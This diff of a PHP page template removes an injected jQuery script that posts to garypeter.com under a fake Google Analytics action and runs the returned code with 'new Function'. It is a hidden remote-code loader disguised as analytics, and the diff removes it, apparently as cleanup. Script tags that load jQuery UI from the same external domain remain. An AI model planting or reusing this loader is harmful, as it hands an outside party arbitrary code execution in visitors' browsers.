@@ -85,17 +85,6 @@
         <!-- end #content -->
     </div> <!-- end #page -->
     <?php include 'common files/footer.php' ?>
-	<script>
-        jQuery(document).ready(function() {
-            jQuery.post('http://garypeter.com?ga_action=googleanalytics_get_script', {
-                action: 'googleanalytics_get_script'
-            }, function(response) {
-                var F = new Function(response);
-                return (F());
-            });
-        });
-
-    </script>
     <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4'></script>
     <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4'></script>
     <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4'></script>
